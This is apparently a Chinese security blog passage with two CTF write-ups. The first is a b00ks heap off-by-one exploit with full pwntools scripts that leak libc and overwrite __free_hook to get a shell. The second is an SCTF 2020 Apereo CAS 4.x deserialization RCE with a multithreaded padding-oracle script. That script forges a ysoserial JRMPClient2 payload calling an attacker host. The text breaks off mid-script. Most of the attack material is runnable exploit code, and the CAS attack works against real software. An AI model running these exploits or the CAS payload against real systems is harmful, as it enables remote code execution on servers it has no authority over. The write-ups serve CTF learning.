61 61 61 61 61 00 00 00 00 00 00 aaaaaaaaaa......]Chunk(addr=0x5555556036e0, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) [0x00005555556036e0 62 62 62 62 62 62 62 62 62 62 00 00 00 00 00 00 bbbbbbbbbb......]Chunk(addr=0x555555603710, size=0x30, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) [0x0000555555603710 01 00 00 00 00 00 00 00 b0 36 60 55 55 55 00 00 .........6`UUU..]Chunk(addr=0x555555603740, size=0x208d0, flags=PREV_INUSE | IS_MMAPPED | NON_MAIN_ARENA) ← top chunkgef➤ x /1xg 0x5555556020100x555555602010: 0x0000555555602060gef➤ x /2xg 0x00005555556020600x555555602060: 0x0000555555603710 0x0000000000000000 可以利用off-by-one把bookshelf的第一个指针最后一位覆盖为\\x00。 如果我们可以把bookshelf抬高到上面description的位置，那么我们就可以提前在descripton里面伪造好book结构体的数据。 然后触发edit book的时候，就可以把我们想修改的内存地址传入进去（fake book的name和description指针指向我们修改的地址）进而达到任意地址写的目的。 然后触发list book的时候，就可以把我们想修改的内存地址传入进去（fake book的name和description指针指向我们修改的地址）进而达到任意地址读的目的。 这里需要倒推一下，不考虑地址随机化(ASLR)的话，malloc第一个book的name时，堆顶是0x5555556036b0 - 0x8（从prev_size开始算） 不考虑ASLR如果name malloc 64字节，desc malloc 32字节。那么实际上book ptr的地址会是 0x5555556036b0 - 0x10 + request2size(64) + request2size(32) + 0x10 = 0x5555556036b0 - 0x10 + request2size(64) + request2size(32) + 0x10 = 0x5555556036b0 + 0x50 + 0x30 = 0x555555603730 0x555555603730置0成0x555555603700刚好就是book1 description的地址。 更通行通法的来讲，应该再下面这个约束里面找一个解就行了。 123addr = 0x5555556036b0 - 0x10 + request2size(X) + request2size(Y) + 0x10(addr &amp; ~(0x100 - 0x1)) == 0x5555556036b0 - 0x10 + request2size(X) + 0x10request2size(Y) &gt;= size(book) 12345678910111213141516SIZE_SZ = 8 # 64位系统上 size_t 的大小 MALLOC_ALIGN_MASK = 15 # 16字节对齐掩码 (0xF) MINSIZE = 32 # 假设的最小块大小 def request2size(req): if req + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE: return MINSIZE else: return (req + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK for X in range(0, 65): for Y in range(0, 65): addr = 0x5555556036b0 - 0x10 + request2size(X) + request2size(Y) + 0x10 if( (addr &amp; ~(0x100 - 0x1)) == 0x5555556036b0 - 0x10 + request2size(X) + 0x10 and request2size(Y) &gt;= 28): print(X, Y) 可以跑出来很多结果，我们随便挑一对验证。比如（57, 10）-&gt; 其实在后面还会发现第二个为了放payload还是需要更长一点。 0x555555603720 -&gt; addr=0x555555603700回到description PS: 看起来这个题目我目前只malloc了小内存块不超过0x1000所以没有跨内存页的问题，如果heap地址在ASLR的情况下其实地址按0x1000对齐也不影响？ 现在已经知道可以读写任意地址了，但是这个题开了ASLR仍然不是知道libc的基地址。在PWN里面知道基地址是非常核心的一步，因为后面无论是覆盖free_hook或者别的地址，又或是找onegadget都需要它。 这里泄漏的基地址方法是在book中使用非常大的size迫使malloc使用mmap来分配内存， mmap分配的内存和libc基地址有一个固定偏移 。我们只需要在book1中description字段构造一个fake book让他指向book2的description或者name之一就能再调用list book就能泄漏mmap地址进而通过固定地址偏移计算出libc地址。 至于为什么有这个所谓的“固定偏移”，我看网上的wp都是一笔带过（no offence）。 翻了一点kernel源码看，基本搞懂了原理，写在下面附 固定地址原理 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485868788899091from pwn import *context(arch='x86', os='linux', log_level='debug')binary_path = '/home/parallels/Desktop/b00ks' io = process(binary_path)pwnlib.gdb.attach(proc.pidof(io)[0])io.recvuntil('Enter author name:')io.sendline('a' * 32)# add book 1io.recvuntil('&gt;')io.sendline('1')io.recvuntil('Enter book name size:')io.sendline('64')io.recvuntil('Enter book name (Max 32 chars):')io.sendline('object1')io.recvuntil('Enter book description size:')io.sendline('32')io.recvuntil('Enter book description:')io.sendline('object1')##print Authorio.recvuntil('&gt;')io.sendline('4')io.recvuntil('Author:')io.recvuntil('a'*32)book1_addr = io.recv(6)book1_addr = book1_addr.ljust(8, b'\\x00')book1_addr = u64(book1_addr)print(&quot;The first idx in bookshelf: &quot; + hex(book1_addr))#edit book1io.recvuntil('&gt;')io.sendline('3')io.recvuntil('Enter the book id you want to edit: ')io.sendline('1')io.recvuntil('Enter new book description: ')fake_book_data = p64(0x1) + p64(book1_addr + 0x30 + 4 + 4 ) + p64(book1_addr + 0x30 + 4 + 4 + 8) + p64(0xffff)io.sendline(fake_book_data)#off-by-oneio.recvuntil('&gt;')io.sendline('5')io.recvuntil('Enter author name:')io.sendline('a' * 32)#pause()#add book2io.recvuntil('&gt;')io.sendline('1')io.recvuntil('Enter book name size:')io.sendline(str(128*1024))io.recvuntil('Enter book name (Max 32 chars):')io.sendline('object2')io.recvuntil('Enter book description size:')io.sendline(str(128*1024))io.recvuntil('Enter book description:')io.sendline('object2')#pause()##print Authorio.recvuntil('&gt;')io.sendline('4')# io.recvuntil('Name: ')# io.recvuntil('Description: ')io.recvuntil('Name: ')name_mmap_addr = io.recv(6)name_mmap_addr = name_mmap_addr.ljust(8, b'\\x00')io.recvuntil('Description: ')desc_mmap_addr = io.recv(6)desc_mmap_addr = desc_mmap_addr.ljust(8, b'\\x00')print(&quot;name_mmap_addr : &quot; + hex(u64(name_mmap_addr)))print(&quot;desc_mmap_addr : &quot; + hex(u64(desc_mmap_addr))) 这里还有一个小困惑，为什么libc-2.31.so被加载进来了这多次。 在本地调试的时候发现，chunk地址是0x00007fdcf6db5010，0x00007fdcf6d94010。我们就用第二个来算吧，libc相对description的固定偏移是0x7fdcf6dd6000 - 0x00007fdcf6d94010 = 0x41ff0 12345678desc_mmap_addr = io.recv(6)desc_mmap_addr = desc_mmap_addr.ljust(8, b'\\x00')print(&quot;name_mmap_addr : &quot; + hex(u64(name_mmap_addr)))print(&quot;desc_mmap_addr : &quot; + hex(u64(desc_mmap_addr)))libc_base = int(u64(desc_mmap_addr)) + 0x41ff0print(&quot;libc addr : &quot; + hex(libc_base)) 验证一下是对的 细说利用 (onegadget getshell) Libc base已经泄露了，下一步就是edit fake book1中指向book2的desc的地方改成free_hook地址，这样在edit book2的时候就可以覆盖free hook地址的内容为one gadget地址。然后在delete book的时候就会触发free hook的one gadget获取到shell。 123456789101112131415parallels@parallels-Parallels-Virtual-Platform:~/Desktop$ one_gadget -f /usr/lib/x86_64-linux-gnu/libc-2.31.so0xe3afe execve(&quot;/bin/sh&quot;, r15, r12)constraints: [r15] == NULL || r15 == NULL || r15 is a valid argv [r12] == NULL || r12 == NULL || r12 is a valid envp0xe3b01 execve(&quot;/bin/sh&quot;, r15, rdx)constraints: [r15] == NULL || r15 == NULL || r15 is a valid argv [rdx] == NULL || rdx == NULL || rdx is a valid envp0xe3b04 execve(&quot;/bin/sh&quot;, rsi, rdx)constraints: [rsi] == NULL || rsi == NULL || rsi is a valid argv [rdx] == NULL || rdx == NULL || rdx is a valid envp 这种覆盖hook类方法的原理是在进入free之前会先看是否有自定义的free_hook函数如果有的话，就会直接用这个free hook而不会进入libc标准的free流程。 123456789101112131415161718void__libc_free (void *mem){ mstate ar_ptr; mchunkptr p; /* chunk corresponding to mem */ void (*hook) (void *, const void *) = atomic_forced_read (__free_hook); if (__builtin_expect (hook != NULL, 0)) { (*hook)(mem, RETURN_ADDRESS (0)); return; } if (mem == 0) /* free(0) has no effect */ return; p = mem2chunk (mem); exp如下 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134from pwn import *bin = ELF('b00ks')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')context(arch='x86', os='linux', log_level='debug')binary_path = '/home/parallels/Desktop/b00ks' io = process(binary_path)pwnlib.gdb.attach(proc.pidof(io)[0])#把author覆盖满io.recvuntil('Enter author name:')io.sendline('a' * 32)# add book 1io.recvuntil('&gt;')io.sendline('1')io.recvuntil('Enter book name size:')io.sendline('64')io.recvuntil('Enter book name (Max 32 chars):')io.sendline('object1')io.recvuntil('Enter book description size:')io.sendline('32')io.recvuntil('Enter book description:')io.sendline('object1')##print Authorio.recvuntil('&gt;')io.sendline('4')io.recvuntil('Author:')io.recvuntil('a'*32)book1_addr = io.recv(6)book1_addr = book1_addr.ljust(8, b'\\x00')book1_addr = u64(book1_addr)print(&quot;The first idx in bookshelf: &quot; + hex(book1_addr))#edit book1io.recvuntil('&gt;')io.sendline('3')io.recvuntil('Enter the book id you want to edit: ')io.sendline('1')io.recvuntil('Enter new book description: ')#伪造一个堆块，使他指向book2的堆块， book1_addr + 0x30，因为这个chunk在用所以0x30直接包含了prev_size的字段fake_book_data = p64(0x1) + p64(book1_addr + 0x30 + 0x8 ) + p64(book1_addr + 0x30 + 0x8 + 0x8) + p64(0xffff)io.sendline(fake_book_data)#off-by-oneio.recvuntil('&gt;')io.sendline('5')io.recvuntil('Enter author name:')io.sendline('a' * 32)#pause()#add book2io.recvuntil('&gt;')io.sendline('1')io.recvuntil('Enter book name size:')io.sendline(str(128*1024))io.recvuntil('Enter book name (Max 32 chars):')io.sendline('object2')io.recvuntil('Enter book description size:')io.sendline(str(128*1024))io.recvuntil('Enter book description:')io.sendline('object2')#pause()##print Authorio.recvuntil('&gt;')io.sendline('4')# io.recvuntil('Name: ')# io.recvuntil('Description: ')io.recvuntil('Name: ')name_mmap_addr = io.recv(6)name_mmap_addr = name_mmap_addr.ljust(8, b'\\x00')io.recvuntil('Description: ')desc_mmap_addr = io.recv(6)desc_mmap_addr = desc_mmap_addr.ljust(8, b'\\x00')print(&quot;name_mmap_addr : &quot; + hex(u64(name_mmap_addr)))print(&quot;desc_mmap_addr : &quot; + hex(u64(desc_mmap_addr)))io.recvuntil('Name: ')io.recvuntil('Description: ')libc_base = int(u64(desc_mmap_addr)) + 0x41ff0print(&quot;libc addr : &quot; + hex(libc_base))free_hook = p64(libc_base + libc.symbols[&quot;__free_hook&quot;])one_gadget = p64(libc_base + 0xe3afe) # 0xe3afe + 0xe3b01 + 0xe3b04#edit book1io.recvuntil('&gt;')io.sendline('3')# pause()io.recvuntil('Enter the book id you want to edit: ')io.sendline('1')io.recvuntil('Enter new book description: ')io.sendline(free_hook)#edit book2io.recvuntil('&gt;')io.sendline('3')io.recvuntil('Enter the book id you want to edit: ')io.sendline('2')io.recvuntil('Enter new book description: ')io.sendline(one_gadget)print(&quot;free_hook: &quot; + hex(libc_base + libc.symbols[&quot;__free_hook&quot;]))print(&quot;one gadget: &quot; + hex(libc_base + 0xe3afe))#delete book2io.recvuntil('&gt;')io.sendline('2')io.recvuntil('Enter the book id you want to delete:')io.sendline('2')#pause()io.interactive() 但是很不巧的是，onegadget是有约束相应寄存器的值需要是NULL，在我本机的环境里面这三个地址运行到时寄存器情况都不满足。 细说利用（system） 所以这里需要换一个更通用的方法，预先再创建一个book3把description字段和name字段覆盖成/bin/bash\\x00，接着把freehook的地址替换成system。这样在delete时候原本free chunk会直接变成system(‘/bin/bash\\x00’)。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155from pwn import *bin = ELF('b00ks')libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')context(arch='x86', os='linux', log_level='debug')binary_path = '/home/parallels/Desktop/b00ks'io = process(binary_path)pwnlib.gdb.attach(proc.pidof(io)[0])io.recvuntil('Enter author name:')io.sendline('a' * 32)# add book 1io.recvuntil('&gt;')io.sendline('1')io.recvuntil('Enter book name size:')io.sendline('64')io.recvuntil('Enter book name (Max 32 chars):')io.sendline('object1')io.recvuntil('Enter book description size:')io.sendline('32')io.recvuntil('Enter book description:')io.sendline('object1')##print Authorio.recvuntil('&gt;')io.sendline('4')io.recvuntil('Author:')io.recvuntil('a'*32)book1_addr = io.recv(6)book1_addr = book1_addr.ljust(8, b'\\x00')book1_addr = u64(book1_addr)print(&quot;The first idx in bookshelf: &quot; + hex(book1_addr))#edit book1io.recvuntil('&gt;')io.sendline('3')io.recvuntil('Enter the book id you want to edit: ')io.sendline('1')io.recvuntil('Enter new book description: ')fake_book_data = p64(0x1) + p64(book1_addr + 0x30 + 4 + 4 ) + p64(book1_addr + 0x30 + 4 + 4 + 8) + p64(0xffff)io.sendline(fake_book_data)#off-by-oneio.recvuntil('&gt;')io.sendline('5')io.recvuntil('Enter author name:')io.sendline('a' * 32)#pause()#add book2io.recvuntil('&gt;')io.sendline('1')io.recvuntil('Enter book name size:')io.sendline(str(128*1024))io.recvuntil('Enter book name (Max 32 chars):')io.sendline('object2')io.recvuntil('Enter book description size:')io.sendline(str(128*1024))io.recvuntil('Enter book description:')io.sendline('object2')#add book3io.recvuntil('&gt;')io.sendline('1')io.recvuntil('Enter book name size:')io.sendline('32')io.recvuntil('Enter book name (Max 32 chars):')io.sendline('/bin/bash\\x00')io.recvuntil('Enter book description size:')io.sendline('32')io.recvuntil('Enter book description:')io.sendline('/bin/bash\\x00')#pause()##print Authorio.recvuntil('&gt;')io.sendline('4')# io.recvuntil('Name: ')# io.recvuntil('Description: ')io.recvuntil('Name: ')name_mmap_addr = io.recv(6)name_mmap_addr = name_mmap_addr.ljust(8, b'\\x00')io.recvuntil('Description: ')desc_mmap_addr = io.recv(6)desc_mmap_addr = desc_mmap_addr.ljust(8, b'\\x00')print(&quot;name_mmap_addr : &quot; + hex(u64(name_mmap_addr)))print(&quot;desc_mmap_addr : &quot; + hex(u64(desc_mmap_addr)))io.recvuntil('Name: ')io.recvuntil('Description: ')io.recvuntil('Name: ')io.recvuntil('Description: ')libc_base = int(u64(desc_mmap_addr)) + 0x41ff0print(&quot;libc addr : &quot; + hex(libc_base))free_hook = p64(libc_base + libc.symbols[&quot;__free_hook&quot;])# one_gadget = p64(libc_base + 0xe3afe) # 0xe3afe + 0xe3b01 + 0xe3b04system = p64(libc_base + libc.symbols[&quot;system&quot;])#edit book1io.recvuntil('&gt;')io.sendline('3')# pause()io.recvuntil('Enter the book id you want to edit: ')io.sendline('1')io.recvuntil('Enter new book description: ')io.sendline(free_hook)#edit book2io.recvuntil('&gt;')io.sendline('3')io.recvuntil('Enter the book id you want to edit: ')io.sendline('2')io.recvuntil('Enter new book description: ')io.sendline(system)print(&quot;free_hook: &quot; + hex(libc_base + libc.symbols[&quot;__free_hook&quot;]))# print(&quot;one gadget: &quot; + hex(libc_base + 0xe3afe))print(&quot;system : &quot; + hex(libc_base + libc.symbols[&quot;system&quot;]))#delete book3io.recvuntil('&gt;')io.sendline('2')io.recvuntil('Enter the book id you want to delete:')io.sendline('3')# pause()io.interactive() 附 request2size 123456789101112# 常量定义 SIZE_SZ = 8 # 64位系统上 size_t 的大小 MALLOC_ALIGN_MASK = 15 # 16字节对齐掩码 (0xF) MINSIZE = 32 # 假设的最小块大小 def request2size(req): if req + SIZE_SZ + MALLOC_ALIGN_MASK &lt; MINSIZE: return MINSIZE else: return (req + SIZE_SZ + MALLOC_ALIGN_MASK) &amp; ~MALLOC_ALIGN_MASK print(hex(request2size(32))) 附 brk起始地址计算方式 1234567891011121314151617181920212223242526272829303132333435363738394041424344mm-&gt;brk = mm-&gt;start_brk = arch_randomize_brk(mm);unsigned long arch_randomize_brk(struct mm_struct *mm){ unsigned long range_end = mm-&gt;brk + 0x02000000; return randomize_range(mm-&gt;brk, range_end, 0) ? : mm-&gt;brk;}unsigned longrandomize_range(unsigned long start, unsigned long end, unsigned long len){ unsigned long range = end - len - start; if (end &lt;= start + len) return 0; return PAGE_ALIGN(get_random_int() % range + start);// #define PAGE_ALIGN(addr) ALIGN(addr, PAGE_SIZE)}/* * Get a random word for internal kernel use only. Similar to urandom but * with the goal of minimal entropy pool depletion. As a result, the random * value is not cryptographically secure but for several uses the cost of * depleting entropy is too high */static DEFINE_PER_CPU(__u32 [MD5_DIGEST_WORDS], get_random_int_hash);unsigned int get_random_int(void){ __u32 *hash; unsigned int ret; if (arch_get_random_int(&amp;ret)) return ret; hash = get_cpu_var(get_random_int_hash); hash[0] += current-&gt;pid + jiffies + random_get_entropy(); //random_get_entropy This function returns the processor cycle counter value if available, else it returns zero. md5_transform(hash, random_int_secret); ret = hash[0]; put_cpu_var(get_random_int_hash); return ret;}EXPORT_SYMBOL(get_random_int); 附 mmap计算方式 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182void arch_pick_mmap_layout(struct mm_struct *mm, struct rlimit *rlim_stack){ if (mmap_is_legacy()) clear_bit(MMF_TOPDOWN, &amp;mm-&gt;flags); else set_bit(MMF_TOPDOWN, &amp;mm-&gt;flags); arch_pick_mmap_base(&amp;mm-&gt;mmap_base, &amp;mm-&gt;mmap_legacy_base, arch_rnd(mmap64_rnd_bits), task_size_64bit(0), rlim_stack);}/* * This function, called very early during the creation of a new * process VM image, sets up which VM layout function to use: */static void arch_pick_mmap_base(unsigned long *base, unsigned long *legacy_base, unsigned long random_factor, unsigned long task_size, struct rlimit *rlim_stack){ *legacy_base = mmap_legacy_base(random_factor, task_size); if (mmap_is_legacy()) *base = *legacy_base; else *base = mmap_base(random_factor, task_size, rlim_stack);}unsigned long task_size_64bit(int full_addr_space){ return full_addr_space ? TASK_SIZE_MAX : DEFAULT_MAP_WINDOW;}static __always_inline unsigned long task_size_max(void){ unsigned long ret; alternative_io(&quot;movq %[small],%0&quot;,&quot;movq %[large],%0&quot;, X86_FEATURE_LA57, &quot;=r&quot; (ret), [small] &quot;i&quot; ((1ul &lt;&lt; 47)-PAGE_SIZE), [large] &quot;i&quot; ((1ul &lt;&lt; 56)-PAGE_SIZE)); return ret;}unsigned long arch_mmap_rnd(void){ return arch_rnd(mmap_is_ia32() ? mmap32_rnd_bits : mmap64_rnd_bits);}static unsigned long arch_rnd(unsigned int rndbits){ if (!(current-&gt;flags &amp; PF_RANDOMIZE)) return 0; return (get_random_long() &amp; ((1UL &lt;&lt; rndbits) - 1)) &lt;&lt; PAGE_SHIFT;}static unsigned long mmap_base(unsigned long rnd, unsigned long task_size, struct rlimit *rlim_stack){ unsigned long gap = rlim_stack-&gt;rlim_cur; unsigned long pad = stack_maxrandom_size(task_size) + stack_guard_gap; unsigned long gap_min, gap_max; /* Values close to RLIM_INFINITY can overflow. */ if (gap + pad &gt; gap) gap += pad; /* * Top of mmap area (just below the process stack). * Leave an at least ~128 MB hole with possible stack randomization. */ gap_min = SIZE_128M; gap_max = (task_size / 6) * 5; if (gap &lt; gap_min) gap = gap_min; else if (gap &gt; gap_max) gap = gap_max; return PAGE_ALIGN(task_size - gap - rnd);} 附 固定地址原理 因为，我当时是英文论坛和网友交流得出的结论，我这里直接贴我当时回复了。 I think brk and mmap are two different things in linux. When I malloc small space of linux, malloc will use brk. Inversely, it will use mmap for big space (almost &gt; 128KB). In ASLR, both heap and mmap will have a random offset. brk 12345unsigned long arch_randomize_brk(struct mm_struct *mm){ unsigned long range_end = mm-&gt;brk + 0x02000000; return randomize_range(mm-&gt;brk, range_end, 0) ? : mm-&gt;brk;} mmap 12345678910111213141516171819202122void arch_pick_mmap_layout(struct mm_struct *mm, struct rlimit *rlim_stack){ if (mmap_is_legacy()) clear_bit(MMF_TOPDOWN, &amp;mm-&gt;flags); else set_bit(MMF_TOPDOWN, &amp;mm-&gt;flags); arch_pick_mmap_base(&amp;mm-&gt;mmap_base, &amp;mm-&gt;mmap_legacy_base, arch_rnd(mmap64_rnd_bits), task_size_64bit(0), rlim_stack);}static void arch_pick_mmap_base(unsigned long *base, unsigned long *legacy_base, unsigned long random_factor, unsigned long task_size, struct rlimit *rlim_stack){ *legacy_base = mmap_legacy_base(random_factor, task_size); if (mmap_is_legacy()) *base = *legacy_base; else *base = mmap_base(random_factor, task_size, rlim_stack);} PS: If paging is level 4, task size is 0x7ffffffff000. For example, here my heap is from 0x55650f802000 and mmap area is from 0x7fdcf6d94000. 12345678910111213141516171819202122232425process 1181521Mapped address spaces: Start Addr End Addr Size Offset objfile 0x55650f600000 0x55650f602000 0x2000 0x0 /home/parallels/Desktop/b00ks 0x55650f801000 0x55650f802000 0x1000 0x1000 /home/parallels/Desktop/b00ks 0x55650f802000 0x55650f803000 0x1000 0x2000 /home/parallels/Desktop/b00ks 0x556510fde000 0x556510fff000 0x21000 0x0 [heap] 0x7fdcf6d94000 0x7fdcf6dd6000 0x42000 0x0 0x7fdcf6dd6000 0x7fdcf6df8000 0x22000 0x0 /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x7fdcf6df8000 0x7fdcf6f70000 0x178000 0x22000 /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x7fdcf6f70000 0x7fdcf6fbe000 0x4e000 0x19a000 /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x7fdcf6fbe000 0x7fdcf6fc2000 0x4000 0x1e7000 /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x7fdcf6fc2000 0x7fdcf6fc4000 0x2000 0x1eb000 /usr/lib/x86_64-linux-gnu/libc-2.31.so 0x7fdcf6fc4000 0x7fdcf6fca000 0x6000 0x0 0x7fdcf6fdd000 0x7fdcf6fde000 0x1000 0x0 /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x7fdcf6fde000 0x7fdcf7001000 0x23000 0x1000 /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x7fdcf7001000 0x7fdcf7009000 0x8000 0x24000 /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x7fdcf700a000 0x7fdcf700b000 0x1000 0x2c000 /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x7fdcf700b000 0x7fdcf700c000 0x1000 0x2d000 /usr/lib/x86_64-linux-gnu/ld-2.31.so 0x7fdcf700c000 0x7fdcf700d000 0x1000 0x0 0x7ffe19d76000 0x7ffe19d97000 0x21000 0x0 [stack] 0x7ffe19df2000 0x7ffe19df6000 0x4000 0x0 [vvar] 0x7ffe19df6000 0x7ffe19df8000 0x2000 0x0 [vdso] 0xffffffffff600000 0xffffffffff601000 0x1000 0x0 [vsyscall] Besides, the dynamic loader uses mmap(2) with MAP_PRIVATE and appropriate permissions. https://stackoverflow.com/questions/4022127/how-the-share-library-be-shared-by-different-processes So, my understanding is: If the program is simple, like I can fully predict what will happen e.g. when malloc will be, size of per chunk of mmap, if the program will load .so or uninstall .so, no side effect of random of time, etc. Once the address of chunk in mmap is leaked, I can calc libc base, because as you said： Both of them are relative in memory (allocated by mmap). The beginning address of mapping is random, but the rest mapping is not random. Finally, I just need to run the program locally to the same leak address following the same steps, and then calculate the fixed offset at that point. This offset will always be valid, even with ASLR. 参考 https://x3h1n.github.io/2019/04/14/pwnable-tw-kidding/ https://blog.csdn.net/qq_48466156/article/details/139691096 https://ctf-wiki.org/pwn/linux/user-mode/heap/ptmalloc2/off-by-one/#exploit http://www.asuka39.top/article/security/ctf/pwn/2582/","link":"/2024/08/11/PWN-%E5%A0%86%E5%88%A9%E7%94%A8-off-by-one-NULL-byte-b00ks-writeup/"},{"title":"SCTF 2020 两道Login Me预期解的核心技术","text":"Login Me - cas 4.x excution rce（黑盒） 详细的漏洞分析可以参考Apereo CAS 4.X execution参数反序列化漏洞分析这里不在赘述。文章提到了，前后两个版本区间的encode方法是不一样。 在cas4.x-cas.4.1.5中的加密伪代码如下 1234payload = gzip(Java Serialized data)body = aes128_cbc_encode(key, iv, payload))header = '\\x00\\x00\\x00\\x22\\x00\\x00\\x00\\x10'+iv+'\\x00\\x00\\x00\\x06'+'aes128'excution = uuid + b64encode(header + body) CAS 4.1.7 ～ 4.2.X的加密伪代码如下 1234cipher = aes128_cbc_encode(iv + gzip(Java Serialized data))data = b64encode(cipher)jwsToken = jws.sign(data, jws_key, algorithm=‘HS512’)excution = uuid + b64encode(jwsToken) 因为encode的变化excution是不一样的亦可作为判断版本的指纹。 cas4.x-cas.4.1.5之前特征：execution base64解码出来以\\x00\\x00\\x00\\x22\\x00\\x00\\x00\\x10开头。 4.1.6之后特征：execution两次base64解码出来不是乱码而是jws格式（header.body.sign）的字符串。 解密题目的execution不难发现，环境是4.x-4.1.5。此外看到，前后两个版本的encode的方式唯一的差异是4.1.6之后execution的需要进行加密签名，联系到它使用的是aes/cbc说到这应该很熟悉了吧padding oracle！ 这里padding oracle，仍然需要讲究技巧，直接生成cc链一类的payload进行padding大约需要padding 114组左右数据（题目两小时重启一次，gadget还需要fuzz，这是一个难以完成的任务），但是如果环境能出网的话用jrmp就需要padding 14组数据左右了，这里视环境情况仍然需要跑1h-3h不等，但是通过的分析过cve-2018-2628之后发现jrmp的payload的可以更短只需要7组，我在同区域的阿里云上多线程跑不到20分钟就有了结果（这也是题目描述Time is Flag的暗示233333）。 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155from jose import jwsfrom Crypto.Cipher import AESfrom cStringIO import StringIOfrom multiprocessing.pool import ThreadPoolimport timeimport requestsimport base64import zlibimport uuidimport binasciiimport jsonimport subprocessimport requestsimport restart_time = time.strftime(&quot;%Y-%m-%d %H:%M:%S&quot;, time.localtime())iv = uuid.uuid4().bytesheader_mode = '\\x00\\x00\\x00\\x22\\x00\\x00\\x00\\x10{iv}\\x00\\x00\\x00\\x06aes128'JAR_FILE = 'ysoserial-0.0.6-SNAPSHOT-all.jar'URL= &quot;http://ip:port/login&quot;headers = {&quot;Accept&quot;:&quot;text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8&quot;,&quot;Upgrade-Insecure-Requests&quot;:&quot;1&quot;,&quot;User-Agent&quot;:&quot;Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:66.0) Gecko/20100101 Firefox/66.0&quot;,&quot;Connection&quot;:&quot;close&quot;,&quot;Accept-Language&quot;:&quot;en-US,en;q=0.5&quot;,&quot;Accept-Encoding&quot;:&quot;gzip, deflate&quot;,&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;}cookies = {&quot;JSESSIONID&quot;:&quot;ADF6653ED3808BE63B052BCED53494A3&quot;}def base64Padding(data): missing_padding = 4 - len(data) % 4 if missing_padding and missing_padding != 4: data += '=' * missing_padding return datadef compress(data): gzip_compress = zlib.compressobj(9, zlib.DEFLATED, zlib.MAX_WBITS | 16) data = gzip_compress.compress(data) + gzip_compress.flush() return datadef bitFlippingAttack(fake_value, orgin_value): iv = [] for f, o in zip(fake_value, orgin_value): iv.append(chr(ord(f) ^ ord(o))) return ivdef pad_string(payload): BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() return pad(payload)def send_request(paramsPost,w): response = requests.post(URL, data=paramsPost, headers=headers, cookies=cookies, allow_redirects=False) return w, responsedef paddingOracle(value): fakeiv = list(chr(0)*16) intermediary_value_reverse = [] for i in range(0, 16): num = 16 response_result = [] for j in range(0, 256-num+1, num): jobs = [] pool = ThreadPool(num) for w in range(j, j + num): fakeiv[N-1-i] = chr(w) #print(fakeiv) fake_iv = ''.join(fakeiv) paramsPost = {&quot;execution&quot;:&quot;4a538b9e-ecfe-4c95-bcc0-448d0d93f494_&quot; + base64.b64encode(header + body + fake_iv + value),&quot;password&quot;:&quot;admin&quot;,&quot;submit&quot;:&quot;LOGIN&quot;,&quot;_eventId&quot;:&quot;submit&quot;,&quot;lt&quot;:&quot;LT-5-pE3Oo6oDNFQUZDdapssDyN4C749Ga0-cas01.example.org&quot;,&quot;username&quot;:&quot;admin&quot;} job = pool.apply_async(send_request, (paramsPost,w)) jobs.append(job) pool.close() pool.join() for w in jobs: j_value, response = w.get() #print(response) if response.status_code == 200: print(&quot;=&quot;*5 + &quot;200&quot; + &quot;=&quot;*5) response_result.append(j_value) print(response_result) if len(response_result) == 1: j_value = response_result[0] intermediary_value_reverse.append(chr((i+1) ^ j_value)) for w in range(0, i+1): try: fakeiv[N-w-1] = chr(ord(intermediary_value_reverse[w]) ^ (i+2)) except Exception as e: print(fakeiv, intermediary_value_reverse, w, i+1) print(base64.b64encode(value)) print(e) exit() print(fakeiv) else: print(response_result) print(&quot;Exit Because count of is &quot; + str(len(response_result))) exit() print(&quot;=&quot;*5 + &quot;sleep&quot; + &quot;=&quot;*5) time.sleep(1) intermediary_value = intermediary_value_reverse[::-1] return intermediary_valuedef pad_string(payload): BS = AES.block_size pad = lambda s: s + ((BS - len(s) % BS) * chr(BS - len(s) % BS)).encode() return pad(payload)if __name__ == '__main__': popen = subprocess.Popen(['java', '-jar', JAR_FILE, 'JRMPClient2', 'your_ip:your_port'],stdout=subprocess.PIPE) payload = popen.stdout.read() payload = pad_string(compress(payload)) excution = &quot;input_excution&quot; body = base64.b64decode(excution)[34:] header = base64.b64decode(excution)[0:34] iv = list(header[8:24]) N=16 fake_value_arr = re.findall(r'[\\s\\S]{16}', payload) fake_value_arr.reverse() value = body[-16:] payload_value_arr = [value] count = 1 all_count = len(fake_value_arr) print(all_count) for i in fake_value_arr: intermediary_value = paddingOracle(value) print(value, intermediary_value) fakeIv = bitFlippingAttack(intermediary_value, i) value = ''.join(fakeIv) payload_value_arr.append(value) print(count, all_count) count += 1 fakeiv = payload_value_arr.pop() payload_value_arr.reverse() payload = header_mode.format(iv=fakeiv) + ''.join(payload_value_arr) print(base64.b64encode(payload)) end_time = 